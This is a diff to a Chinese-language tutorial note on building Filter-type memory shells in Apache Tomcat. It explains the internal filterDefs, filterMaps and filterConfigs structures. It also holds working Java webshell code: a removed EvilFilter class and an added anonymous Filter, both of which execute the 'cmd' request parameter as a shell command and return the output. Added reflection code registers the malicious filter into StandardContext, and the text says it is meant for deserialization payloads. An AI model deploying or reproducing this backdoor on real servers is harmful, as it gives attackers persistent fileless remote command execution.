@@ -127,6 +127,8 @@ ok开始分析
 ![](picture/Pasted%20image%2020260105192710.png)
 最后 return回去，走到刚刚看的doFilter，真正的执行Filter。
 
+
+
 # Filter内存马攻击思路
 内存马的思路就是
 如果我也写一段代码，调用 Context 里的某个 `put` 方法（虽然它是私有的，但我们可以用反射），把我的马塞进 `filterConfigs` 这个 Map。那么，Tomcat 在下次执行 `findFilterConfig` 时，就会“无意识”地把我的马取出来执行。
@@ -176,6 +178,8 @@ private HashMap<String, FilterDef> filterDefs = new HashMap();
 private final StandardContext.ContextFilterMaps filterMaps = new StandardContext.ContextFilterMaps();
 ```
 
+
+
 讲完了一些基础的概念，我们来看一看 ApplicationFilterConfig 里面存了什么东西
 它有三个重要的东西：  
 一个是Context，一个是filter，一个是filterDef
@@ -190,6 +194,16 @@ private final StandardContext.ContextFilterMaps filterMaps = new StandardContext
 
 还有就是他有这个方法，可以把映射关系添加到 `filterMap`中
 ![](picture/Pasted%20image%2020260105195422.png)
+
+总结下来：
+动态添加一个`Filter`过程大致如下:
+ - 获取`standardContext`.
+ - 创建`Filter`.
+ - 利用`filterDef`封装`Filter`对象, 并将`filterDef`添加到`filterDefs`里面.
+ - 创建`filterMap`, 将`url`和`filter`进行绑定并添加到`filterMaps`里面.
+ - 利用`ApplicationFilterConfig`封装`filterDef`对象并添加到`filterConfigs`里面.
+
+
 ## 构造
 所以我们的构造思路如下：
 1. 获取当前的标准上下文对象
@@ -200,63 +214,13 @@ private final StandardContext.ContextFilterMaps filterMaps = new StandardContext
 
 
 #  Filter 型内存马的实现
-首先我们先写一个我们自己的恶意 `filter` ，模仿标准的filterchain，结合之前的回显传统木马。
-```java
-import javax.servlet.*;  
-import javax.servlet.http.HttpServletRequest;  
-import javax.servlet.http.HttpServletResponse;  
-  
-import java.io.IOException;  
-import java.io.InputStream;  
-import java.util.Scanner;  
-  
-  
-public class EvilFilter implements Filter {  
-    public void destroy() {  
-    }  
-  
-    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {  
-        HttpServletRequest req = (HttpServletRequest) request;  
-        HttpServletResponse resp = (HttpServletResponse) response;  
-        if (req.getParameter("cmd") != null) {  
-            boolean isLinux = true;  
-            String osTyp = System.getProperty("os.name");  
-            if (osTyp != null && osTyp.toLowerCase().contains("win")) {  
-                isLinux = false;  
-            }  
-            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};  
-            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
-            Scanner s = new Scanner(in).useDelimiter("\\A");  
-            String output = s.hasNext() ? s.next() : "";  
-            resp.getWriter().write(output);  
-            resp.getWriter().flush();  
-        }  
-        chain.doFilter(request, response);  
-    }  
-  
-    public void init(FilterConfig config) throws ServletException {  
-  
-    }  
-  
-}
-```
-ok没问题
-![](picture/Pasted%20image%2020260105202507.png)
-那我们就要想办法把他塞进上下文了
-前面说，Filter 的注入涉及到 **`filterDefs`**（定义）、**`filterMaps`**（路由映射）以及 **`filterConfigs`**（运行实例缓存）这三个关键变量。将恶意 Filter 的信息和实例分别填充进这三个容器，即可完成内存马的打入。因此，如何绕过沙箱或封装直接获取到当前 Web 应用的 `StandardContext` 实例，成了实现攻击的核心前提。
-
->于是初步思路是这样拿到上下文对象的：
->```java
-WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  //从线程中拿到当前线程ContextClassLoader
->
-StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();//拿到WebResourceRoot接口的实例，强转为StandarRoot，其中有指向StandardContext的引用。
->
->StandardContext standardContext = (StandardContext) standardroot.getContext();
->```
 
 标准思路是这样的
 ![](picture/Pasted%20image%2020260105212912.png)
-先是通过反射获取到 standContext
+
+## 反射获取到 standContext
+
+`standardContext`主要负责管理`session`，`Cookie`，`Servlet`的加载和卸载, 因此在`Tomcat`中的很多地方都有保存。如果我们能够直接获取`request`的时候，可以使用以下方法直接获取`context`。`Tomcat`在启动时会为每个`Context`都创建一个`ServletContext`对象，表示一个`Context`, 从而可以将`ServletContext`转化为`StandardContext`。
 ```java
 ServletContext servletContext = request.getSession().getServletContext();//先通过session拿到ServletContext ，本质是ApplicationContextFacade的马甲类 
   
@@ -280,6 +244,49 @@ ServletContext servletContext = request.getSession().getServletContext();//先�
  //后面把恶意的Filter put到map中
 ```
 
+## 创建Filter
+直接在代码中实现`Filter`实例，需要重写三个重要方法: `init`、`doFilter`、`destory`。
+
+```java
+Filter filter = new Filter() {
+
+    @Override
+    public void init(FilterConfig filterConfig) {
+
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+
+        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
+        if (httpServletRequest.getParameter("cmd") != null) {
+            InputStream inputStream = Runtime.getRuntime().exec(httpServletRequest.getParameter("cmd")).getInputStream();
+            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
+            String output = scanner.hasNext() ? scanner.next() : "";
+            servletResponse.getWriter().write(output);
+            return;
+        }
+        filterChain.doFilter(servletRequest, servletResponse);
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+};
+```
+## 创建filterDef封装Filter对象
+如下代码将内存马融合进了反序列化的`payload`中，因此这里利用了反射来获取`FilterDef`对象。如果使用的是`jsp`或者是非反序列化的利用，则可以直接使用`new`来创建对象。
+
+```java
+Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+Constructor filterDefDeclaredConstructor = FilterDef.getDeclaredConstructor();
+FilterDef filterDef = (FilterDef) filterDefDeclaredConstructor.newInstance();
+filterDef.setFilter(filter);
+filterDef.setFilterName(FilterName);
+filterDef.setFilterClass(filter.getClass().getName());
+standardContext.addFilterDef(filterDef);
+```
 
 
 
